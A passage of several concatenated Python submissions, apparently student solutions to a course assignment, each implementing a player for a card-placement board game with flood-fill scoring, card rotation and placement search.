                if self.cardForm[i][j] == 'C':
                    stack = [[i,j]]
                    while stack:
                        tmp = stack.pop()
                        x = tmp[0]
                        y = tmp[1]
                        if tmp in checkedTiles:
                            continue
  
                        checkedTiles.append(tmp)
                          
                        if self.cardForm[x][y] == 'C':
  
                            if x - 1 >= 0:
                                stack.append([x-1, y])
  
                            if x + 1 < self.height:
                                stack.append([x+1, y])
          
                            if y - 1 >= 0:
                                stack.append([x, y-1])
  
                            if y + 1 < self.width:
                                stack.append([x, y+1])
                        else: 
                            floodFillHelp.append(tmp)
                            self.N_positions_list.append(tmp)
    
        for position in self.N_positions_list:
              
            stack = [position]
            tmpCheck = []
              
            while stack:
  
                tmp = stack.pop()
                x = tmp[0]
                y = tmp[1]  
  
                if tmp in tmpCheck:
                    continue
                currentTileValue = self.placeablePositionsForm[x][y]
                if  currentTileValue == 0 or tmp in floodFillHelp or currentTileValue == 'N':
                      
                    self.placeablePositionsForm[x][y] = 'N'
                    if x - 1 >= max(0, position[0] - (maxSize)):
                        stack.append([x-1, y])
  
                    if x + 1 < min(self.height, position[0] + maxSize):
                        stack.append([x+1, y])
          
                    if y - 1 >= max(0, position[1] - (maxSize)):
                        stack.append([x, y-1])
  
                    if y + 1 < min(self.width, position[1]  + maxSize):
                        stack.append([x, y+1])

                    tmpCheck.append(tmp)
  
    def checkIfIsConnected(self, card, x, y):
        #self.force_placeCard(card,x,y)

        checkedTiles = []
        stack = [[x,y]] 
        while stack:

            tmp = stack.pop()
            tmp_x = tmp[0]
            tmp_y = tmp[1]
            if tmp in checkedTiles:
                continue

            if self.board[tmp_x][tmp_y] != 0:
                checkedTiles.append(tmp)
                    
                if tmp_x - 1 >= 0:
                    stack.append([tmp_x-1,tmp_y])
                
                if tmp_x + 1 < self.height:
                    stack.append([tmp_x+1,tmp_y])
                
                if tmp_y - 1 >= 0:
                    stack.append([tmp_x,tmp_y-1])
                
                if tmp_y + 1 < self.width:
                    stack.append([tmp_x,tmp_y+1])

                if tmp_x > x + card.height-1 or tmp_x < x or tmp_y > y + card.width-1 or tmp_y < y:
                    #self.unplaceCard(card,x,y)
                    return True
        #self.unplaceCard(card,x,y)
        return False

    def evalBoard(self, card, x, y):   
        totalScore = 0
        checkedTiles = []
        for i in range(x,x+card.height):
            for j in range(y,y+card.width):
                if self.board[i][j] == "X":
                    continue
                if [i,j] in checkedTiles:
                    continue
                stack = [[i,j]]
                color = self.board[i][j]
                score = 0
                  
                wasOutsideOfCard = False
                while stack:
  
                    tmp = stack.pop()
                    tmp_x = tmp[0]
                    tmp_y = tmp[1]
                    if tmp in checkedTiles:
                        continue
 
                    if self.board[tmp_x][tmp_y] == color:
                        checkedTiles.append(tmp)
                         
                        score += 1
      
                        if tmp_x - 1 >= 0:
                            stack.append([tmp_x-1,tmp_y])
                      
                        if tmp_x + 1 < self.height:
                            stack.append([tmp_x+1,tmp_y])
                     
                        if tmp_y - 1 >= 0:
                            stack.append([tmp_x,tmp_y-1])
                      
                        if tmp_y + 1 < self.width:
                            stack.append([tmp_x,tmp_y+1])
  
                        if tmp_x > x + card.height-1 or tmp_x < x or tmp_y > y + card.width-1 or tmp_y < y:
                            wasOutsideOfCard = True
  
                if wasOutsideOfCard:
                    totalScore += score    
              
          
        return totalScore
                      
  
class Card:
    def __init__(self, height, width, color):
        self.height = height
        self.width = width
        self.color = color    
        self.matrixForm = fillMatrix(initializeMatrix([self.height, self.width]), self.color)
          
    def draw(self):
        for i in range(len(self.matrixForm)):
            for j in range(len(self.matrixForm[i])):
                if self.matrixForm[i][j] == 0:
                    print('X', end=' ')
                else:
                    print(self.matrixForm[i][j], end=' ')
            print()
      
    def output(self, x, y):
          
        output = []
          
        for item in self.color:
            output.append(item)
          
        output.insert(0,self.width)
        output.insert(0,self.height)
  
        output.insert(0,y)
        output.insert(0,x)
        return output
  
    def initialize_rotations(self):
        tmpMatrix1 = []
        tmpMatrix2 = []
        tmpMatrix3 = []
  
        for i in range(self.width):
            tmpRow = []
            for j in range(self.height):
                tmpRow.append(self.matrixForm[j][i])
  
            tmpMatrix1.insert(0,tmpRow)
  
        for i in range(self.height):
            tmpRow = []
            for j in range(self.width):
                tmpRow.append(tmpMatrix1[j][i])
      
            tmpMatrix2.insert(0,tmpRow)
  
        for i in range(self.width):
            tmpRow = []
            for j in range(self.height):
                tmpRow.append(tmpMatrix2[j][i])
      
            tmpMatrix3.insert(0,tmpRow)
   
        originalRot = Card(self.height, self.width, self.color)
        firstRot = Card(len(tmpMatrix1),len(tmpMatrix1[0]),serializeMatrix(tmpMatrix1))
        secondRot = Card(len(tmpMatrix2),len(tmpMatrix2[0]),serializeMatrix(tmpMatrix2))
        thirdRot = Card(len(tmpMatrix3),len(tmpMatrix3[0]),serializeMatrix(tmpMatrix3))
  
        rotations = [originalRot,firstRot,secondRot,thirdRot]
  
        self.rotations = rotations
  
#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "My awesome player"
        self.score = 0
        self.board = Board(self.boardRows, self.boardCols)

        self.myCardsAtHand = []
        for card in self.cardsAtHand:
            tmpCard = Card(len(card),len(card[0]),serializeMatrix(card))
            self.myCardsAtHand.append(tmpCard)
        
        for card in self.myCardsAtHand:
            card.initialize_rotations()
        
        self.opponentUsed = []

        self.is_firstTurn = True

        self.maxCardDimensions = findLargestCardDimensions(self.myCardsAtHand)
        self.board.initialize_cardForm()
        self.board.initialze_placeablePositionBoard()
        self.board.update_CardForm()
        self.board.update_placeabelPositionsForm(self.maxCardDimensions)
        

    def play(self,newCardOnDesk):
        if newCardOnDesk != []:
            self.is_firstTurn = False

            myNewCardOnDesk = Card(len(newCardOnDesk[2]), len(newCardOnDesk[2][0]), serializeMatrix(newCardOnDesk[2]))
            self.board.force_placeCard(myNewCardOnDesk,newCardOnDesk[0],newCardOnDesk[1])
            self.cardsOnDesk.append(newCardOnDesk)

        self.board.initialize_cardForm()
        self.board.update_CardForm()
        self.maxCardDimensions = findLargestCardDimensions(self.myCardsAtHand)
        #self.board.initialze_placeablePositionBoard()
        self.board.update_placeabelPositionsForm(self.maxCardDimensions)
        #print(self.myCardsAtHand)
        #printMatrix(self.board.placeablePositionsForm)
        #print(self.maxCardDimensions)

        if self.is_firstTurn:
            a = random.randint(0,self.board.height - self.maxCardDimensions)
            b = random.randint(0,self.board.width - self.maxCardDimensions)
            c = random.randint(0,len(self.myCardsAtHand)-1)
            self.board.force_placeCard(self.myCardsAtHand[c],a,b)
            placedCard = self.myCardsAtHand.pop(c)
            self.is_firstTurn = False
            self.cardsOnDesk.append([a,b,placedCard.matrixForm])
            return [a,b,placedCard.matrixForm]


        maxScore = -1
        cardIndex = -1
        
        for card in self.myCardsAtHand:
            cardIndex += 1
            for i in range(self.board.height):
                for j in range(self.board.width):
                    if self.board.placeablePositionsForm[i][j] != 'N':
                        continue
                    rotationIndex = -1
                    for rot in card.rotations:
                        rotationIndex += 1
                        legalPlacement = self.board.placeCard(rot,i,j)
        
                        if legalPlacement:
                            if not self.board.checkIfIsConnected(rot,i,j):
                                self.board.unplaceCard(rot,i,j)
                                continue
                            
                            currentScore = self.board.evalBoard(rot,i,j)
        
                            if currentScore > maxScore:
                                maxScore = currentScore
                                output = rot.output(i,j)
                                outputCard = cardIndex
                                outputRot = rotationIndex
        
                            self.board.unplaceCard(rot,i,j)
        #print(maxScore)
        if maxScore == -1:
            return []
        else:
            self.score += maxScore
            placedCard = self.myCardsAtHand.pop(outputCard)
            self.board.force_placeCard(placedCard.rotations[outputRot],output[0],output[1])
            self.cardsOnDesk.append([output[0],output[1],placedCard.rotations[outputRot].matrixForm])

            return [output[0],output[1],placedCard.rotations[outputRot].matrixForm]
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """

        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position

       


if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:

        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            print('P1 score: ',p1.score)
            print('P2 score: ',p2.score)


            quit()


    bradnjir
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/bradnjir______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "My awesome player 42"
        self.max_x = boardCols - 1
        self.max_y = boardRows - 1
        self.board = []
        self.edges = []

        for _ in range(boardRows):
            row = []
            for _ in range(boardCols):
                row.append(-1)
            self.board.append(row)

    def play(self, newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """

        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position

        self.update_board(newCardOnDesk)

        if len(newCardOnDesk) == 3:
            self.cardsOnDesk += [newCardOnDesk]

        if len(self.cardsAtHand) == 0:
            return []

        if len(self.cardsOnDesk) > 0:
            new_card_placement = self.get_highest_score_placement()
            if new_card_placement is None:
                return []
            #self.update_board(new_card_placement)
            #return new_card_placement
            row = new_card_placement[0]
            col = new_card_placement[1]
            card = new_card_placement[2]
            cardindx = new_card_placement[3]

        else:
            cardindx = random.randint(0, len(self.cardsAtHand)-1)  #random index of a card
            card = self.cardsAtHand[cardindx]
            cardRows = len(card)
            cardCols = len(card[0])
            row = random.randint(0, self.boardRows-cardRows-1)
            col = random.randint(0, self.boardCols-cardCols-1)
        self.cardsAtHand = self.cardsAtHand[:cardindx] + self.cardsAtHand[cardindx+1:]  #remove selected card so its not used in future
        self.cardsOnDesk += [ [row, col, card ] ]
        self.update_board([row, col, card])
        return [row, col, card ]

    def get_highest_score_placement(self):
        possible_placements = self.find_card_placement_spots()
        if len(possible_placements) == 0:
            return None
        unique_data = [list(item) for item in set(tuple(sublist) for sublist in possible_placements)]
        sorted_data = sorted(unique_data, key=lambda x: x[3], reverse=True)
        cardIndex = sorted_data[0][1]
        rotation = sorted_data[0][4]
        position = sorted_data[0][0]

        card = self.cardsAtHand[cardIndex]
        if rotation > 0:  # 90, 180, 270 - rotate once
            card = self.rotate_card(card, True)

        if rotation >= 180:  # 180, 270 - rotate second time
            card = self.rotate_card(card, True)

        if rotation == 270:  # 180, 270 - rotate third time
            card = self.rotate_card(card, True)

        return position[0], position[1], card, cardIndex


    def update_board(self, newCardOnDesk):
        if len(newCardOnDesk) == 0:
            return
        card_height = len(newCardOnDesk[2])
        card_width = len(newCardOnDesk[2][0])
        card_y = newCardOnDesk[0]
        card_x = newCardOnDesk[1]
        x = card_x
        y = card_y

        # mark edges
        for j in range(card_x, card_x + card_width):
            if y > 0 and self.board[card_y - 1][j] == -1:
                self.board[card_y - 1][j] = -2
                self.edges.append((card_y - 1, j))
            if (y + card_height - 1 < self.max_y) and self.board[card_y + card_height][j] == -1:
                self.board[card_y + card_height][j] = -2
                self.edges.append((card_y + card_height, j))

        # add numbers to board
        for j in range(card_height):
            for k in range(card_width):
                if self.board[y][x] == -2:
                    self.edges.remove((y, x))
                self.board[y][x] = newCardOnDesk[2][j][k]
                x += 1
            if card_x > 0 and self.board[y][card_x - 1] == -1:
                self.board[y][card_x - 1] = -2
                self.edges.append((y, card_x - 1))
            if x < self.max_x and self.board[y][x] == -1:
                self.board[y][x] = -2
                self.edges.append((y, x))
            y += 1
            x = card_x

    def find_card_placement_spots(self):
        output = []

        for edge_position in self.edges:
            for card_index in range(len(self.cardsAtHand)):
                card = self.cardsAtHand[card_index]
                card_width = len(card[0])
                card_height = len(card)
                max_delta = max(card_width, card_height)
                #print(card_height, card_width)
                can_move_up = True
                can_move_left = True
                can_move = True
                x = edge_position[1]
                y = edge_position[0]
                #while can_move_up:
                #    while can_move_left:
                while can_move:
                    can_place_card = False
                    can_place_card_rotated = False
                    if (edge_position[1] - x + 1 <= card_width) and (edge_position[0] - y + 1 <= card_height):
                        can_place_card = self.try_place_card((card_height, card_width), (y, x))
                    if (edge_position[1] - x + 1 <= card_height) and (edge_position[0] - y + 1 <= card_width):
                        can_place_card_rotated = self.try_place_card((card_width, card_height), (y, x))
                    if can_place_card:
                        score, score_180 = self.check_placement_score(card_index, False, (y, x))
                        output.append([(y,x), card_index, False, score, 0])
                        output.append([(y,x), card_index, False, score_180, 180])

    #                    print(y,x)
                    if can_place_card_rotated:
                        score, score_180 = self.check_placement_score(card_index, True, (y, x))
                        output.append([(y,x), card_index, True, score, 90])
                        output.append([(y,x), card_index, True, score_180, 270])

                    if (x == 0) or (x == edge_position[1] - max_delta + 1):#maximum to the left
                        if (y == 0) or (y == edge_position[0] - max_delta + 1):#maximum up
                            can_move = False
                        else:#can move up - change x to starting position
                            y -= 1
                            x = edge_position[1]
                    else:#can move left
                        x -= 1

        return output

    def try_place_card(self, card_size, start_position):
        if (start_position[0] + card_size[0] - 1 > self.max_y) or (start_position[1] + card_size[1] - 1 > self.max_x):
            return False
        for y in range(start_position[0], start_position[0] + card_size[0]):
            for x in range(start_position[1], start_position[1] + card_size[1]):
                if self.board[y][x] >= 0:
                    return False

        return True

    def check_placement_score(self, card_index, card_rotated, start_position):
        score = 0 #score for card with default rotation or rotated clockwise 90 deg
        score_180 = 0 #score for card with default rotation or rotated clockwise 90 deg + 180 deg rotation

        card = self.cardsAtHand[card_index]
        if card_rotated:
            card = self.rotate_card(card, True)

        score = self.check_edges_score(card, start_position)

        card = self.rotate_card(self.rotate_card(card, True), True)
        score_180 = self.check_edges_score(card, start_position)

        return score, score_180

    def check_edges_score(self, card, start_position):
        score = 0
        start_x = start_position[1]
        start_y = start_position[0]

        checked_positions = []
        checked_positions_card = []

        card_width = len(card[0])
        card_height = len(card)

        # top edge:
        if start_y > 0:  # check cards above
            for x in range(card_width):
                if (card[0][x] > 0) and (self.board[start_y - 1][start_x + x] == card[0][x]):
                    score = self.get_neighbor_score(self.board, card[0][x], (start_y - 1, start_x + x), checked_positions, score)
                    score = self.get_neighbor_score(card, card[0][x], (0, x), checked_positions_card, score)
        # bottom edge
        if start_y + card_height <= self.max_y:  # check cards bellow
            for x in range(card_width):
                if (card[card_height - 1][x] > 0) and (
                        self.board[start_y + card_height][start_x + x] == card[card_height - 1][x]):
                    score = self.get_neighbor_score(self.board, card[card_height - 1][x], (start_y + card_height, start_x + x),
                                               checked_positions, score)
                    score = self.get_neighbor_score(card, card[card_height - 1][x], (card_height - 1, x), checked_positions_card,
                                               score)
        # left edge:
        if start_x > 0:  # check cards on the left
            for y in range(card_height):
                if (card[y][0] > 0) and (self.board[start_y + y][start_x - 1] == card[y][0]):
                    score = self.get_neighbor_score(self.board, card[y][0], (start_y + y, start_x - 1), checked_positions, score)
                    score = self.get_neighbor_score(card, card[y][0], (y, 0), checked_positions_card, score)
        # right edge
        if start_x + card_width <= self.max_x:  # check cards on the right
            for y in range(card_height):
                if (card[y][card_width - 1] > 0) and (self.board[start_y + y][start_x + card_width] == card[y][card_width - 1]):
                    score = self.get_neighbor_score(self.board, card[y][card_width - 1], (start_y + y, start_x + card_width),
                                               checked_positions, score)
                    score = self.get_neighbor_score(card, card[y][card_width - 1], (y, card_width - 1), checked_positions_card,
                                               score)

        return score

    def get_neighbor_score(self, board, color_num, start_position, checked_positions, score):
        if board[start_position[0]][start_position[1]] != color_num or start_position in checked_positions:
            return score

        score += 1
        checked_positions.append(start_position)
        if start_position[0] > 0:#top
            score = self.get_neighbor_score(board, color_num, (start_position[0] - 1, start_position[1]), checked_positions, score)
        if start_position[0] < len(board) - 1:#bottom
            score = self.get_neighbor_score(board, color_num, (start_position[0] + 1, start_position[1]), checked_positions, score)
        if start_position[1] > 0:#left
            score = self.get_neighbor_score(board, color_num, (start_position[0], start_position[1] - 1), checked_positions, score)
        if start_position[1] < len(board[0]) - 1:#right
            score = self.get_neighbor_score(board, color_num, (start_position[0], start_position[1] + 1), checked_positions, score)

        return score

    def rotate_card(self, card, rotate_left):
    #always rotates right
        rotated_matrix = []
        original_width = len(card[0])
        original_height = len(card)

        for _ in range(original_width):
            rotated_matrix.append([0]*original_height)

        if (rotate_left):
            for row in range(original_height):
                for col in reversed(range(original_width)):
                    rotated_matrix[col][row] = card[original_height - row - 1][col]

        return rotated_matrix


if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    rehakj16
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/rehakj16______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


def print_matrix(m: list):
    print('  '.join(str(i%10) for i in range(len(m[0]))))
    for i, row in enumerate(m):
        print('  '.join(str(cell) for cell in row) + "  " + str(i%10))

#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

empty_char = -1


def create_histogram(board):
    last_numbers = [0 for _ in range(len(board[0]))]
    result = []
    for y in board:
        # print(y)
        line_result = [0] * len(y)
        for i, num in enumerate(y):
            if num == empty_char:
                line_result[i] = last_numbers[i] + 1
        last_numbers = line_result
        result.append(line_result)
    return result


class Tile:   
    def __init__(self, row, col, matrix):
        
        # r, c coords of left upper corner
        # R, C size of the tile
        # colors are array of colors
        
        # self.r = corner[0]
        # self.c = corner[1]
        self.r = row
        self.c = col
        self.R = len(matrix)
        self.C = len(matrix[0])
        self.matrix = matrix
        
        self.best_score = 0
        self.best_score_coords = []
        self.best_rotation = 0
        self.rotation = 0

    def place_on_coords(self, board, coords):
        # print("Starting position ", self.c, self.r, self.R, self.C)
        for h in range(self.R):
            for w in range(self.C):
                if board[coords[0] + h][coords[1] + w] == empty_char:
                    board[coords[0] + h][coords[1] + w] = self.matrix[h][w]
                else:
                    return False
        return True

    def remove_coords(self, board, coords):
        # print("Starting position ", self.c, self.r, self.R, self.C)
        for h in range(self.R):
            for w in range(self.C):
                board[coords[0] + h][coords[1] + w] = empty_char
    
    def place_on_board(self, board):
        # print("Starting position ", self.c, self.r, self.R, self.C)
        for h in range(self.R):
            for w in range(self.C):
                if board[self.r + h][self.c + w] == empty_char:
                    board[self.r + h][self.c + w] = self.matrix[h][w]
                else:
                    # print("CANT BE PLACED")
                    return False
        return True

    def get_score_of_placement(self, board, coords, size):
        self.place_on_coords(board, coords)
        
        done = []
        result = 0
        # Go around and each tile that has not been done calculate
        # print("RESULT START THE COUNTER")
        for w in range(self.C):
            # print("counting for", [coords[0], coords[1] + w])
            # print(done)
            new_done, count = self.flood_fill_score(board, [coords[0], coords[1] + w],coords, size, done if type(done) == list else [])
            if new_done:
                done = new_done
            result += count
            # print("count 1", count)
            # print("counting for", [coords[0] + self.R-1, coords[1] + w])
            new_done, count = self.flood_fill_score(board, [coords[0] + self.R - 1, coords[1] + w],coords, size, done if type(done) == list else [])
            if new_done:
                done = new_done
            result += count
            # print("count 2",count)
        
        for h in range(self.R - 2):
            # print("counting for", [coords[0] + h + 1, coords[1]])
            # print("done", done)
            new_done, count = self.flood_fill_score(board, [coords[0] + h, coords[1]],coords, size, done if type(done) == list else [])
            if new_done:
                done = new_done
            result += count
            # print("count 3", count)
            
            # print("counting for", [coords[0] + h + 1, coords[1] + self.C-1])
            new_done, count = self.flood_fill_score(board, [coords[0] + h + 1, coords[1] + self.C - 1], coords, size, done if type(done) == list else [])
            if new_done:
                done = new_done
            # print("count 4",count)
            result += count
        # print("Result", result)

        if result > self.best_score:
            self.best_score = result
            self.best_score_coords = coords
            self.best_rotation = self.rotation
        # print_matrix(board)
        self.remove_coords(board, coords)
            
        return result
    
    def flood_fill_score(self, matrix, start, card_coords, card_size, done = []):
        stack = [start]
        # print("Coords of the starting one are ", start)
        count = 0
        starting_color = -1
        is_going_outside = False
        
        while stack:
            cords = stack.pop(0)
            if cords in done:
                # print("cords are done")
                return done, 0
            if starting_color == -1:
                starting_color = matrix[cords[0]][cords[1]]
                # print("Initiating with color", starting_color)
            elif starting_color == 0:
                # print("Starting color is 0")
                return 0,0
            
            if 0 <= cords[0] < len(matrix) and 0 <= cords[1] < len(matrix[0]) and (matrix[cords[0]][cords[1]] == starting_color):
                count += 1
                done.append([cords[0], cords[1]])
                
                if not is_going_outside and (cords[0] < card_coords[0] or cords[0] >= card_coords[0] + card_size[0] or cords[1] < card_coords[1] or cords[1] >= card_coords[1] + card_size[1]):
                    is_going_outside = True
                
                if not [cords[0]-1, cords[1]] in done: stack.append([cords[0]-1, cords[1]])
                if not [cords[0]+1, cords[1]] in done: stack.append([cords[0]+1, cords[1]])
                if not [cords[0], cords[1]-1] in done: stack.append([cords[0], cords[1]-1])
                if not [cords[0], cords[1]+1] in done: stack.append([cords[0], cords[1]+1])
        if not is_going_outside:
            # print("Not going outside")
            count = 0
        # print("Returning done and count:", done, count)
        return done, count        

    def rotate(self, to=None):
        if to is not None:
            amount = (to - self.rotation) % 4
        else:
            amount = 1
        
        for _ in range(amount):
            new_matrix = [[0] * self.R for _ in range(self.C)]
            for r in range(self.R):
                for c in range(self.C):
                    new_matrix[c][self.R - 1 - r] = self.matrix[r][c]
            self.matrix = new_matrix
            self.R, self.C = self.C, self.R
            self.rotation = (self.rotation + 1) % 4
        
    def __str__(self):
        return f"Tile at ({self.r}, {self.c}) with size ({self.R}, {self.C}) and matrix {self.matrix}"



def _check_from_bot(histogram, row_id, i, width):
    for j in range(width):
        if (row_id + 1 < len(histogram)) and (histogram[row_id + 1][i - j] == 0):
            return True
    return False

def _check_from_top(histogram, row_id, i, width, height):
    for j in range(width):
        if (row_id - height >= 0) and (histogram[row_id - height][i - j] == 0):
            return True
    return False
        
        
def can_be_placed_in_line(histogram, row_id, width, height):
    current_width = 0
    columns = []
    for i, l in enumerate(histogram[row_id]):
        if l > height or l == height:
            if l > height:
                current_width += 1
            if l == height:
                current_width += 1

            if current_width >= width:               
                if _check_from_top(histogram, row_id,i, width, height):
                    columns.append([row_id - height +1,i-width +1])
                
                # Touching from right
                elif (i+1 < len(histogram[row_id])) and (histogram[row_id][i+1] < height):
                    # print("right")
                    columns.append([row_id - height +1, i-width +1])
                # Check from bottom
                
                elif _check_from_bot(histogram, row_id, i, width):
                    # print("bot")
                    columns.append([row_id - height +1, i - width + 1])

                # Check from left
                elif (i - width >= 0) and (histogram[row_id][i - width] < height):
                    # print("left")
                    columns.append([row_id - height +1, i-width +1])
        else:
            current_width = 0
    
    return columns

def where_to_place(histogram, tile):
    tile_width = tile.C
    tile_height = tile.R
    columns = []
    
    for row_id in range(tile_height-1,len(histogram)):
        columns += can_be_placed_in_line(histogram, row_id, tile_width, tile_height)
    if columns:
        return columns
    return False   


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "My awesome player"
        self.board =  [[empty_char for _ in range(boardCols)] for _ in range(boardRows)]
        self.histogram = None

    def play(self,newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """


        t = time.time()
        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position

        
        if len(newCardOnDesk) == 3:
            # print("revceived new card")
            card = Tile(*newCardOnDesk)
            card.place_on_board(self.board)
            self.cardsOnDesk += [ newCardOnDesk ]
        
        if len(self.cardsAtHand) == 0:
            return []
        
        self.histogram = create_histogram(self.board)
        best_score = 0
        best_score_card = None
        best_score_index = None
        
        placed = False
        
        
        # Place the first card on random
        if len(self.cardsOnDesk) == 0:
            # print("FIRST CARD")
            
            matrix = self.cardsAtHand.pop(0)
            row = random.randint(0, self.boardRows-len(matrix)-1) 
            col = random.randint(0, self.boardCols-len(matrix[0])-1)
            
            self.cardsOnDesk.append([row, col, matrix])
            Tile(row, col, matrix).place_on_board(self.board)
            return [row, col, matrix]
            
        last_card_to_place = (None, None, None, None) # card, index, rotation, coords
        
        for index, card_to_place in enumerate(self.cardsAtHand):
            card = Tile(0,0,matrix=card_to_place)
            for rotation in range(4):
                columns = where_to_place(self.histogram, card)
                if columns:
                    for i in columns:
                        card.get_score_of_placement(self.board, i, [card.R, card.C])
                        placed = True
                        last_card_to_place = (card, index, rotation, [card.R, card.C])
                        # print(time.time()-t)
                        # panic card place
                        if time.time()-t > .9:
                            if last_card_to_place:
                                c, index, rotation, cords =  last_card_to_place
                                c.rotate(rotation)
                                
                                self.cardsAtHand = self.cardsAtHand[:index] + self.cardsAtHand[index+1:]
                                c.place_on_coords(self.board, cords)
                                self.cardsOnDesk += [ [cords[0], cords[1], card.matrix ] ]
                                return [cords[0], cords[1], card.matrix]
                            else:
                                return []
                        
                card.rotate()
            
            
            if card.best_score > 0 and placed:
                card.rotate(card.best_rotation)
                
                if card.best_score > best_score:
                    best_score = card.best_score
                    best_score_card = card
                    best_score_index = index
        
        if best_score > 0:
            self.cardsAtHand = self.cardsAtHand[:best_score_index] + self.cardsAtHand[best_score_index+1:]
            best_score_card.place_on_coords(self.board, best_score_card.best_score_coords)
            self.cardsOnDesk += [ [best_score_card.best_score_coords[0], best_score_card.best_score_coords[1], best_score_card.matrix ] ]
            return [best_score_card.best_score_coords[0], best_score_card.best_score_coords[1], best_score_card.matrix]
        else:
            if placed:
                card, index, rotation, cords =  last_card_to_place
                card.rotate(rotation)
                
                self.cardsAtHand = self.cardsAtHand[:index] + self.cardsAtHand[index+1:]
                card.place_on_coords(self.board, cords)
